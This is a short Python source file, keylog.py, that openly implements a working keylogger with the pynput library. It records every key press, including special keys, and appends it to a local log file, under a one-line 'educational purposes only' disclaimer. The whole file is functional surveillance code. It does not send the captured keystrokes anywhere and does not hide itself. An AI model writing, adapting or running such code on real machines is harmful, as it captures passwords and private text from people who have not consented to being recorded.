"""
keylog.py - Basic keylogger implementation in Python.

For educational purposes only. Ensure compliance with local laws before use.
"""

import os

from pynput import keyboard

LOG_FILE = os.getenv("KEYLOG_FILE", "keylog.txt")


def on_press(key: keyboard.Key | keyboard.KeyCode) -> None:
    try:
        char = key.char  # type: ignore[union-attr]
    except AttributeError:
        char = f"[{key.name}]"  # type: ignore[union-attr]

    with open(LOG_FILE, "a") as f:
        f.write(char)


def main() -> None:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
